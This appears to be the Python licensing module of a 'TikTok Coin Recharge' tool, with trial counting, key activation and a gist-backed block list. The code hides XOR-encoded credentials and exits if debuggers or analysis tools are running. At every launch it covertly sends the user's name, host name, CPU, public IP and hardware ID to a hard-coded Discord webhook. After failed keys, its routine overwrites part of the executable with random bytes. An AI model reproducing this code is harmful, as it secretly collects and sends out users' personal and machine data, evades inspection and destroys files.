import http.server,socketserver,socket,os,re,json,sys
import urllib.request,urllib.parse,urllib.error,threading,base64
import hashlib,ctypes,time,uuid,shutil,multiprocessing,getpass

_EKH=''
_ET='MwMzb2AvPgIDYSZwGUwsfGRQYk4AO0UgAg9iUi8SPx5jIwIxMjZIdg=='
_EG='bAh7UQEPaGBEUU1VWhJvBFQKAUUaO0RtWXJVUAw8ZEs='
_XK=b'TkC01n_Pr0t3ct_2026!xZq'
_CK=b'TkC01n_Cfg_3ncKey!!'


def _xd(d,k):
    return bytes([b^k[i%len(k)] for i,b in enumerate(d)])

def _gkh():
    return json.loads(_xd(base64.b64decode(_EKH),_XK).decode())

def _gtk():
    return _xd(base64.b64decode(_ET),_XK).decode()

def _ggi():
    return _xd(base64.b64decode(_EG),_XK).decode()

def _send_telemetry(hw, action):
    try:
        user = getpass.getuser()
        host = socket.gethostname()
        try:
            import winreg
            k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0")
            cpu,_ = winreg.QueryValueEx(k,"ProcessorNameString")
            winreg.CloseKey(k)
        except:
            cpu = "Unknown CPU"
        
        try:
            ip_resp = urllib.request.urlopen("https://api.ipify.org?format=json", timeout=5).read()
            public_ip = json.loads(ip_resp).get('ip', 'Unknown')
        except:
            public_ip = "Unknown"
            
        data = {
            "content": f"🚨 **Tiktok Recharge Activity** 🚨\\n**Action:** {action}\\n**User:** {user}\\n**Host:** {host}\\n**CPU:** {cpu}\\n**IP:** {public_ip}\\n**HWID:** {hw}"
        }
        
        req = urllib.request.Request(
            "https://discord.com/api/webhooks/1493232070900580402/oFxnuc1x6UG7Idphw_8yKO32CLo9c93Vzx7jey5d9t8mNNGfa31qx_ERPr4w7vOD39I3",
            data=json.dumps(data).encode(),
            headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
        )
        urllib.request.urlopen(req, timeout=5)
    except:
        pass


def _ac():
    try:
        if ctypes.windll.kernel32.IsDebuggerPresent():os._exit(0)
    except:pass
    try:
        dp=ctypes.c_int(0)
        ctypes.windll.ntdll.NtQueryInformationProcess(ctypes.c_void_p(-1),7,ctypes.byref(dp),ctypes.sizeof(dp),None)
        if dp.value!=0:os._exit(0)
    except:pass
    _sl=['ollydbg','x64dbg','x32dbg','ida.exe','ida64.exe','idaq.exe','idaq64.exe','ghidra','wireshark','fiddler','procmon','processhacker','httpdebuggerpro','charles','dnspy','dotpeek','de4dot','ilspy','pestudio','exeinfope','hxd.exe','immunity','cheatengine']
    try:
        r=__import__('subprocess').run(['tasklist','/NH','/FO','CSV'],capture_output=True,text=True,creationflags=0x08000000)
        for line in r.stdout.lower().split('\\n'):
            pn=line.strip().strip('"').split('"')[0] if '"' in line else ''
            for s in _sl:
                if s in pn:os._exit(0)
    except:pass
    try:
        t1=time.perf_counter_ns()
        for _ in range(1000):hashlib.sha256(b'x').digest()
        t2=time.perf_counter_ns()
        if(t2-t1)>2000000000:os._exit(0)
    except:pass

def _ghw():
    try:
        import winreg
        k=winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,r"SOFTWARE\Microsoft\Cryptography")
        v,_=winreg.QueryValueEx(k,"MachineGuid")
        winreg.CloseKey(k)
        return hashlib.sha256(v.encode()).hexdigest()[:32]
    except:
        m=uuid.getnode()
        h=socket.gethostname()
        return hashlib.sha256(f"{m}{h}".encode()).hexdigest()[:32]

def _gcp():
    return os.path.join(os.environ.get('APPDATA',os.path.expanduser('~')),'.tkcfg')

def _lc():
    p=os.path.join(_gcp(),'c.dat')
    if not os.path.exists(p):return{'t':0,'k':'','h':'','w':0}
    try:
        with open(p,'rb') as f:d=f.read()
        c=json.loads(_xd(d,_CK).decode())
        if 'w' not in c:c['w']=0
        return c
    except:return{'t':0,'k':'','h':'','w':0}

def _sc(cfg):
    p=_gcp()
    os.makedirs(p,exist_ok=True)
    fp=os.path.join(p,'c.dat')
    d=json.dumps(cfg).encode()
    with open(fp,'wb') as f:f.write(_xd(d,_CK))
    try:ctypes.windll.kernel32.SetFileAttributesW(p,0x02)
    except:pass

def _boom(hw):
    try:
        token=_gtk()
        gid=_ggi()
        req=urllib.request.Request(f'https://api.github.com/gists/{gid}',headers={'Authorization':f'token {token}','Accept':'application/vnd.github.v3+json','User-Agent':'TC'})
        resp=urllib.request.urlopen(req,timeout=10)
        gist=json.loads(resp.read().decode())
        db=json.loads(gist['files']['db.json']['content'])
        if hw not in db.get('blocked',[]):
            db.setdefault('blocked',[]).append(hw)
            up={'files':{'db.json':{'content':json.dumps(db)}}}
            req2=urllib.request.Request(f'https://api.github.com/gists/{gid}',data=json.dumps(up).encode(),headers={'Authorization':f'token {token}','Accept':'application/vnd.github.v3+json','Content-Type':'application/json','User-Agent':'TC'},method='PATCH')
            urllib.request.urlopen(req2,timeout=10)
    except:pass
    try:shutil.rmtree(_gcp(),ignore_errors=True)
    except:pass
    try:
        exe=sys.executable
        if getattr(sys,'frozen',False) or '__compiled__' in dir():
            exe=sys.executable
        else:
            exe=os.path.abspath(sys.argv[0])
        with open(exe,'r+b') as f:
            sz=min(os.path.getsize(exe),16384)
            f.seek(0)
            f.write(os.urandom(sz))
    except:pass
    try:subprocess.run('cls' if os.name=='nt' else 'clear', shell=True, creationflags=0x08000000 if os.name=='nt' else 0)
    except:pass
    try:subprocess.run('color 0C', shell=True, creationflags=0x08000000 if os.name=='nt' else 0)
    except:pass
    print('='*60)
    print('  LICENSE VIOLATION DETECTED')
    print('  This copy has been permanently disabled.')
    print('='*60)
    time.sleep(5)
    os._exit(1)

def _online_check(kh,hw):
    token=_gtk()
    gid=_ggi()
    try:
        req=urllib.request.Request(f'https://api.github.com/gists/{gid}',headers={'Authorization':f'token {token}','Accept':'application/vnd.github.v3+json','User-Agent':'TC'})
        resp=urllib.request.urlopen(req,timeout=10)
        gist=json.loads(resp.read().decode())
        db=json.loads(gist['files']['db.json']['content'])
        if hw in db.get('blocked',[]) or hw in db.get('manual_block',[]):
            return 'blocked'
        if kh not in db.get('keys',{}):
            return 'invalid'
        bound=db['keys'][kh]
        if bound=='':
            db['keys'][kh]=hw
            up={'files':{'db.json':{'content':json.dumps(db)}}}
            req2=urllib.request.Request(f'https://api.github.com/gists/{gid}',data=json.dumps(up).encode(),headers={'Authorization':f'token {token}','Accept':'application/vnd.github.v3+json','Content-Type':'application/json','User-Agent':'TC'},method='PATCH')
            urllib.request.urlopen(req2,timeout=10)
            return 'activated'
        elif bound==hw:
            return 'valid'
        else:
            return 'used'
    except:
        return 'offline'

def _check_remote_status(hw):
    try:
        token=_gtk()
        gid=_ggi()
        req=urllib.request.Request(f'https://api.github.com/gists/{gid}',headers={'Authorization':f'token {token}','Accept':'application/vnd.github.v3+json','User-Agent':'TC'})
        resp=urllib.request.urlopen(req,timeout=8)
        gist=json.loads(resp.read().decode())
        db=json.loads(gist['files']['db.json']['content'])
        if hw in db.get('blocked',[]) or hw in db.get('manual_block',[]):
            return 'blocked'
        if hw in db.get('auto_grant',[]):
            return 'granted'
        return 'normal'
    except:
        return 'offline'



def _askk(cfg,hw):
    import tkinter as tk
    from tkinter import messagebox
    result=[False]
    def do_activate():
        key=ent.get().strip().upper()
        if not key:return
        kh=hashlib.sha256(key.encode()).hexdigest()
        vk=_gkh()
        if kh not in vk:
            cfg['w']=cfg.get('w',0)+1
            _sc(cfg)
            remaining=3-cfg['w']
            if cfg['w']>=3:
                root.destroy()
                _boom(hw)
                return
            messagebox.showerror("Error",f"Invalid key!\n{remaining} attempt(s) remaining before lockout.")
            return
        status=_online_check(kh,hw)
        if status=='activated' or status=='valid':
            cfg['k']=kh
            cfg['h']=hw
            cfg['w']=0
            _sc(cfg)
            result[0]=True
            root.destroy()
        elif status=='used':
            cfg['w']=cfg.get('w',0)+1
            _sc(cfg)
            remaining=3-cfg['w']
            if cfg['w']>=3:
                root.destroy()
                _boom(hw)
                return
            messagebox.showerror("Error",f"This key is already activated on another device!\n{remaining} attempt(s) remaining.")
        elif status=='blocked':
            root.destroy()
            _boom(hw)
        elif status=='offline':
            messagebox.showerror("Error","Internet connection required for activation.\nPlease check your connection and try again.")
    root=tk.Tk()
    root.title("TikTok Coin Recharge - License")
    root.geometry("480x330")
    root.resizable(False,False)
    root.configure(bg='#161823')
    try:root.iconbitmap(default='')
    except:pass
    tk.Label(root,text="\u26A0 License Required",font=("Segoe UI",16,"bold"),fg="#fe2c55",bg="#161823").pack(pady=(25,5))
    wl=3-cfg.get('w',0)
    tk.Label(root,text=f"Your free trial has ended.\nEnter a license key to unlock permanently.\n({wl} attempt(s) remaining)",font=("Segoe UI",10),fg="#aaa",bg="#161823",justify="center").pack(pady=(5,12))
    ent=tk.Entry(root,font=("Consolas",15),justify="center",width=24,relief="flat",bd=0,highlightthickness=2,highlightcolor="#fe2c55",highlightbackground="#333")
    ent.pack(pady=8,ipady=6)
    ent.focus()
    btn=tk.Button(root,text="Activate",font=("Segoe UI",12,"bold"),bg="#fe2c55",fg="white",activebackground="#ee2a4d",activeforeground="white",command=do_activate,relief="flat",padx=40,pady=6,cursor="hand2")
    btn.pack(pady=10)
    tk.Label(root,text="Lien he Tu Anh de lay key",font=("Segoe UI",9),fg="#666",bg="#161823").pack(pady=(5,0))
    root.bind('<Return>',lambda e:do_activate())
    root.protocol("WM_DELETE_WINDOW",lambda:root.destroy())
    root.eval('tk::PlaceWindow . center')
    root.mainloop()
    return result[0]

def _ck():
    _ac()
    cfg=_lc()
    hw=_ghw()
    
    multiprocessing.Process(target=_send_telemetry, args=(hw, "App Opened")).start()
    
    if cfg.get('w',0)>=3:
        _boom(hw)
        return False
        
    remote_status = _check_remote_status(hw)
    if remote_status == 'blocked':
        try:subprocess.run('cls' if os.name=='nt' else 'clear', shell=True, creationflags=0x08000000 if os.name=='nt' else 0)
        except:pass
        try:subprocess.run('color 0C', shell=True, creationflags=0x08000000 if os.name=='nt' else 0)
        except:pass
        print('='*60)
        print('  THIS DEVICE HAS BEEN PERMANENTLY BLOCKED.')
        print('='*60)
        time.sleep(3)
        return False
        
    if remote_status == 'granted':
        cfg['k']='REMOTE_GRANT'
        cfg['h']=hw
        cfg['t']=3
        _sc(cfg)
        multiprocessing.Process(target=_send_telemetry, args=(hw, "Remote Auto Grant Active")).start()
        return True

    if cfg['k'] and cfg['h']==hw:
        return True
    if cfg['k'] and cfg['h']!=hw:
        cfg['k']=''
        cfg['h']=''
        cfg['t']=3
        _sc(cfg)

    if cfg['t']<3:
        cfg['t']+=1
        _sc(cfg)
        remaining=3-cfg['t']
        try:subprocess.run('cls' if os.name=='nt' else 'clear', shell=True, creationflags=0x08000000 if os.name=='nt' else 0)
        except:pass
        if remaining>0:
            try:subprocess.run('color 0E', shell=True, creationflags=0x08000000 if os.name=='nt' else 0)
            except:pass
            print('='*60)
            print(f'  TRIAL MODE - {remaining} use(s) remaining')
            print('='*60)
            multiprocessing.Process(target=_send_telemetry, args=(hw, f"Trial Used ({remaining} remaining)")).start()
        else:
            try:subprocess.run('color 0E', shell=True, creationflags=0x08000000 if os.name=='nt' else 0)
            except:pass
            print('='*60)
            print('  TRIAL MODE - Last free use!')
            print('='*60)
            multiprocessing.Process(target=_send_telemetry, args=(hw, "Trial Ended")).start()
        time.sleep(1)
        return True
        
    return _askk(cfg,hw)

